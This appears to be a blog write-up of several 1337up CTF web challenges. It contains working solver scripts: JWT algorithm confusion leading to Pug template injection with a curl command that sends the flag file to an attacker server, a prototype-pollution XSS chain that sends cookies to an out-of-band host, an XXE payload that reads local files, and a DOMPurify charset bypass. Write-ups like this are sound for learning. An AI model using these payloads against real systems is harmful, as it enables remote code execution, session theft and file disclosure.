---
title: "1337up CTF - Web challenges"
tags:
  - JWT Key Confusion Attack
  - code Review
  - web
  - CTF 
  - Pug SSTI
---

# CTF Challenges 

## Overview - Cat Club Web Application

The challenge involves exploiting a Node.js web application that has two key vulnerabilities:
    - Server-side Template Injection (SSTI) in Pug templates
    - JWT token vulnerability through algorithm confusion

## Application Structure

- `GET /jwks.json`: Returns the JSON Web Key Set (JWKS).
- `GET /`: Renders the home page.
- `GET /register` and `GET /login`: Renders the login/register page.
- `POST /login`: Authenticates a user and sets a JWT token.
- `POST /register`: Registers a new user and sets a JWT token.
- `GET /cats`: Renders the cat gallery page.
- `GET /logout`: Logs out the user by clearing the JWT token.


![ ](../ctf-web/1337ctf/image.png) 

walking through the code code we noticed a potential template injection since there's a user input passed directly to `pug.render()` 

```javascript
router.get("/cats", getCurrentUser, (req, res) => {
    if (!req.user) {
        return res.redirect("/login?error=Please log in to view the cat gallery");
    }

    const templatePath = path.join(__dirname, "views", "cats.pug");

    fs.readFile(templatePath, "utf8", (err, template) => {
        if (err) {
            return res.render("cats");
        }

        if (typeof req.user != "undefined") {
            template = template.replace(/guest/g, req.user);
        }

        const html = pug.render(template, {
            filename: templatePath,
            user: req.user,
        });

        res.send(html);
    });
});
```

![alt text](../ctf-web/1337ctf/cats.png)

but there's an issue there's some sort of sanitization applied on username

```javascript
const { BadRequest } = require("http-errors");

function sanitizeUsername(username) {
    const usernameRegex = /^[a-zA-Z0-9]+$/;

    if (!usernameRegex.test(username)) {
        throw new BadRequest("Username can only contain letters and numbers.");
    }

    return username;
}

module.exports = {
    sanitizeUsername,
};
``` 
so for now we need an alternative , we noticed that the username is does exist in the jwt token so if we control the jwt token payload we could achieve the template injection


```javascript
function getCurrentUser(req, res, next) {
    const token = req.cookies.token;

    if (token) {
        verifyJWT(token)
            .then((payload) => {
                req.user = payload.username;
                res.locals.user = req.user;
                next();
            })
            .catch(() => {
                req.user = null;
                res.locals.user = null;
                next();
            });
    } else {
        req.user = null;
        res.locals.user = null;
        next();
    }
}
```

## JWT key confusion 
```javascript
const privateKey = fs.readFileSync(path.join(__dirname, "..", "private_key.pem"), "utf8");
const publicKey = fs.readFileSync(path.join(__dirname, "..", "public_key.pem"), "utf8");

function signJWT(payload) {
    return new Promise((resolve, reject) => {
        jwt.encode(privateKey, payload, "RS256", (err, token) => {
            if (err) {
                return reject(new Error("Error encoding token"));
            }
            resolve(token);
        });
    });
}

function verifyJWT(token) {
    return new Promise((resolve, reject) => {
        if (!token || typeof token !== "string" || token.split(".").length !== 3) {
            return reject(new Error("Invalid token format"));
        }

        jwt.decode(publicKey, token, (err, payload, header) => {
            if (err) {
                return reject(new Error("Invalid or expired token"));
            }

            if (header.alg.toLowerCase() === "none") {
                return reject(new Error("Algorithm 'none' is not allowed"));
            }

            resolve(payload);
        });
    });
}
``` 
The none algorithm is blocked, so we can't remove the signature verification but how about algorithm confusion? If we can change the token from RS256 (asymmetric) to HS256 (symmetric) and then sign with the public key, the server will use the same key to verify the signature 

this is the solver 

```python
import httpx
import subprocess
from base64 import urlsafe_b64decode
from Crypto.PublicKey import RSA

BASE_URL = 'https://catclub-0.ctf.intigriti.io'
REGISTER_URL = f'{BASE_URL}/register'
LOGIN_URL = f'{BASE_URL}/login'
JWK_URL = f'{BASE_URL}/jwks.json'
CAT_URL = f'{BASE_URL}/cats'
JWT_TOOL_PATH = f'./jwt_tool'

SSTI_PAYLOAD = "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad('child_process').exec('curl https://ATTACKER_SERVER/?flag=$(cat /flag* | base64)')}()}"

def base64url_decode(data):
    return urlsafe_b64decode(data + b'=' * (-len(data) % 4))

def register_user(username, password):
    response = httpx.post(REGISTER_URL, data={"username": username, "password": password})
    return response.status_code == 200

def login_user(username, password):
    client = httpx.Client()
    response = client.post(LOGIN_URL, data={"username": username, "password": password})
    if response.status_code == 303:
        response = client.get(BASE_URL)
    token = client.cookies.get("token")
    return token

def download_jwk():
    response = httpx.get(JWK_URL)
    if response.status_code == 200:
        return response.json()['keys'][0]
    else:
        return None

def rsa_public_key_from_jwk(jwk):
    n = base64url_decode(jwk['n'].encode('utf-8'))
    e = base64url_decode(jwk['e'].encode('utf-8'))
    n_int = int.from_bytes(n, 'big')
    e_int = int.from_bytes(e, 'big')
    rsa_key = RSA.construct((n_int, e_int))
    public_key_pem = rsa_key.export_key('PEM')
    with open("recovered_public.key", "wb") as f:
        f.write(public_key_pem)
        if not public_key_pem.endswith(b'\n'):
            f.write(b"\n")

def modify_jwt_with_tool(token):
    command = [
        "python", f"{JWT_TOOL_PATH}/jwt_tool.py", token, "-X", "k", "-pk", "./recovered_public.key", "-I", "-pc", "username", "-pv", SSTI_PAYLOAD
    ]
    result = subprocess.run(command, capture_output=True, text=True)
    for line in result.stdout.splitlines():
        if line.startswith("[+] "):
            modified_token = line.split(" ")[1].strip()
            return modified_token
    return None

def test_ssti(modified_token):
    cookies = {'token': modified_token}
    response = httpx.get(CAT_URL, cookies=cookies)

def main():
    username = "cat"
    password = "cat"

    if not register_user(username, password):
        return

    jwt_token = login_user(username, password)
    if not jwt_token:
        return

    jwk = download_jwk()
    if not jwk:
        return

    rsa_public_key_from_jwk(jwk)

    modified_jwt = modify_jwt_with_tool(jwt_token)
    if not modified_jwt:
        return

    test_ssti(modified_jwt)

if __name__ == "__main__":
    main()
``` 
1- Registers a user
2- Gets JWT token from login
3- Retrieves public key from JWKS endpoint
4- Modifies JWT token (RS256 → HS256) using jwt_tool
5- Injects Pug template payload for RCE
6- Makes request with modified token

# WorkBreak 

### Objective

The goal is to exploit an XSS vulnerability on the challenge domain and leverage it to exfiltrate the session cookie of the support engineer.

### Exploitation Steps

1. **User Creation and Traffic Analysis**:
    - Create a user in the WorkBreak application.
    - Analyze the HTTP traffic and identify the endpoints `/api/user/profile` and `/api/user/settings` used to retrieve and submit profile information.
2. **Identifying Vulnerabilities**:
    - Notice that data submitted via the `/api/user/settings` endpoint is reflected under the `"dynamicInfo"` key in the JSON response from the `/api/user/profile` endpoint, indicating a potential mass assignment vulnerability.
3. **Reviewing `performance_chart.js`**:
    - Understand the script consumes a `tasks` JSON array, with objects having `tasksCompleted` and `date` keys.
    - The `tasksCompleted` key is inserted into the sink via the `.html()` method of the D3.js library.
    
    ```javascript
    const taskCounts = generateTaskHeatmapData(taskData);
    const today = new Date().toISOString().split("T")[0];
    const todayTask = taskData.find((task) => task.date === today);
    const todayTasksDiv = d3.select("#todayTasks");
    if (todayTask) {
        todayTasksDiv.html(`Tasks Completed Today: ${todayTask.tasksCompleted}`);
    } else {
        todayTasksDiv.html("Tasks Completed Today: 0");
    }
    
    ```
    
4. **Crafting Initial XSS Payload**:JSON
    - Attempt to exploit XSS by injecting a payload into `tasksCompleted` JSON key with today’s date.
    
    ```json
    {
        "name": "zzzzz",
        "phone": "",
        "position": "",
        "tasks": [
            {
                "date": "YYYY-MM-DD",
                "tasksCompleted": "<img/src/onerror=alert()>"
            }
        ]
    }
    
    ```
    
    - Receive response: `"error": "Not Allowed to Modify Tasks"`
5. **Bypassing Input Validation**:
    - Notice potential prototype pollution vulnerability in `profile.js` script.
    
    `const userSettings = Object.assign({ name: "", phone: "", position: "" }, profileData.dynamicInfo);`
    
    - Craft payload using prototype pollution:
    
    ```json
    {
        "name": "zzzzzz",
        "phone": "",
        "position": "",
        "__proto__": {
            "tasks": [
                {
                    "date": "YYYY-MM-DD",
                    "tasksCompleted": "<img/src/onerror=alert()>"
                }
            ]
        }
    }
    
    ```
    
    - Inject payload successfully but origin is 'null' due to sandbox iframe.
6. **Finding Another Sink**:
    - Review `profile.js` script for another exploitable sink.
    
    ```javascript
    window.addEventListener(
        "message",
        (event) => {
            if (event.source !== frames[0]) return;
            document.getElementById(
                "totalTasks"
            ).innerHTML = `<p>Total tasks completed: ${event.data.totalTasks}</p>`;
        },
        false
    );
    
    ```
    
    - Send postMessage to EventListener to exploit the second XSS vulnerability:
    
    ```
    (async () => {
        parent.postMessage({ totalTasks: "<img/src/onerror=eval(atob(<ENCODED_PAYLOAD>))>" }, "*");
    })();
    
    ```
    
7. **Crafting the Final Payload**:
    - Combine all vulnerabilities to craft a payload for exfiltrating the session cookie of the support engineer.

### Solution Script

```python
import httpx
import base64
import datetime

DOMAIN = ""  # Change
oast = "aaa.oastify.com"  # Change

# Get a session
async with httpx.AsyncClient() as client:
    await client.post(f"http://{DOMAIN}/api/auth/signup", json={"email": "zwx@xin.cn", "password": "zz1337"})
    login_res = await client.post(f"http://{DOMAIN}/api/auth/login", json={"email": "zwx@xin.cn", "password": "zz1337"}, follow_redirects=False)
    sid = login_res.cookies.get("SID")
    print(f"[+] session retrieved successfully: {sid}")

    extract_flag = "(async () => {await fetch(`https://" + oast + "/?${document.cookie}`);})();"
    post_message_payload = f"(async () => {{parent.postMessage({{\"totalTasks\":\"<img/src/onerror=eval(atob('{base64.b64encode(extract_flag.encode('utf-8')).decode()}'))>\"}},'*');}})()"
    payload = {
        "name": "Anon",
        "phone": "",
        "position": "",
        "__proto__": {
            "tasks": [
                {
                    "date": datetime.date.today().strftime("%Y-%m-%d"),
                    "tasksCompleted": f"<img/src/onerror=eval(atob(\"{base64.b64encode(post_message_payload.encode('utf-8')).decode()}\"))>",
                }
            ]
        },
    }
    await client.post(f"http://{DOMAIN}/api/user/settings", headers={"Cookie": f"SID={sid}"}, json=payload)
    print("[+] payload has been persisted!")
    uuid_res = await client.get(f"http://{DOMAIN}/", headers={"Cookie": f"SID={sid}"}, follow_redirects=False)
    await client.post(f"http://{DOMAIN}/api/support/chat", headers={"Cookie": f"SID={sid}"}, json={"message":f"http://{DOMAIN}{uuid_res.headers['Location']}"})
    print("[+] admin exploited - check the collaborator")
```


# Biocorp - A simple XEE 

here's the solver 
```python
import requests

# Define the target URL
url = 'https://biocorp.ctf.intigriti.io/panel.php'

# Define the headers
headers = {
    'Host': 'biocorp.ctf.intigriti.io',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'X-Biocorp-Vpn': '80.187.61.102',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Priority': 'u=0, i',
    'Te': 'trailers',
    'Content-Type': 'application/xml'
}

# Define the XML payload
xml_payload = '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE reactor [
<!ELEMENT reactor ANY >
<!ENTITY xxe SYSTEM "file:///flag.txt" >]>
<reactor>
    <status>
        <temperature>&xxe;</temperature>
        <pressure>1337</pressure>
        <control_rods>Lowered</control_rods>
    </status>
</reactor>
'''

response = requests.post(url, headers=headers, data=xml_payload)
print(response.text)
```

# Sushi Search - after the contest

so we have a simple Fastify application - here's the key point

```javascript
fastify.get("/search", async (req, reply) => {
    const query = req.query.search || "";

    const matchedItems = items.filter(
        (item) =>
            item.title.toLowerCase().includes(query.toLowerCase()) ||
            item.description.toLowerCase().includes(query.toLowerCase())
    );

    const window = new JSDOM("").window;
    const DOMPurify = createDOMPurify(window);
    const cleanQuery = DOMPurify.sanitize(query);

    const resp = await ejs.renderFile(path.resolve(__dirname, "views", "result.ejs"), {
        message: cleanQuery,
        items: matchedItems,
    });
    reply.type("text/html").send(resp);
});
```

1. **Charset Manipulation Vulnerability**
- The `/search` endpoint doesn't specify charset in Content-Type header
- Uses DOMPurify for sanitization but vulnerable to encoding differentials

2. **Attack Chain**
```javascript
const cleanQuery = DOMPurify.sanitize(query);
reply.type("text/html").send(resp);
```
    
3. **Exploitation Steps**
- Insert ISO-2022-JP escape sequences (`\x1b$B` and `\x1b(B`)
- Browser auto-detects ISO-2022-JP encoding due to escape sequences
- DOMPurify sanitizes in UTF-8 but browser interprets as ISO-2022-JP
- Characters are interpreted differently between sanitization and rendering
- Allows XSS payload injection bypassing DOMPurify

```javascript
<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="%1b$B"></a>%1b(B<a%20id="><img%20src=x%20onerror=alert()%20></a>
```

![alt text](../ctf-web/1337ctf/xss.png)

6. **Credits**
- https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/ 
- https://x.com/kevin_mizu/status/1812882499875319959 

# Fruitables 

This was a simple question . Tl;dr :

1- Postgresql injection in the login form 
2- get and crack credentials tjfry_admin 
3- abuse the upload functionality in the admin portal to serve a webshell
4- cat the flag :D 

sadly didn't have time to do all the pwn challenges 

